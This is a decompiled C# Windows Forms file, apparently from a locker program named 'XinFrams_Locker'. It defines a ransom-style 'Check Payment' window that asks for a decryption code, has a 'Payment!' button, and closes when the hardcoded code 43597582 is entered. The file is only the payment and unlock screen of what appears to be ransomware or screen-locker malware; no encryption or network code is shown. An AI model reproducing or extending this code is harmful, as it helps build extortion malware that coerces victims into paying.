using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace XinFrams_Locker;

public class Form7 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Button button1;

	public Form7()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("Incorrect Key!", "Incorrect Key", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "43597582")
		{
			MessageBox.Show("The Key Is correct!", "Unlock Success!", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Application.Exit();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0330: Unknown result type (might be due to invalid IL or missing references)
		//IL_033a: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("UD デジタル 教科書体 NK-B", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(13, 13));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(110, 15));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Check Payment");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("UD デジタル 教科書体 NK-B", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(14, 61));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(164, 15));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Enter Decryption Code:");
		((Control)textBox1).set_BackColor(Color.Lime);
		((Control)textBox1).set_Font(new Font("UD デジタル 教科書体 NK-B", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(17, 89));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(361, 23));
		((Control)textBox1).set_TabIndex(2);
		((Control)button1).set_BackColor(Color.Lime);
		((Control)button1).set_Font(new Font("UD デジタル 教科書体 NK-B", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(17, 124));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(82, 23));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Payment!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(0, 0, 192));
		((Form)this).set_ClientSize(new Size(390, 171));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Font(new Font("MS UI Gothic", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form7");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Check Payment");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
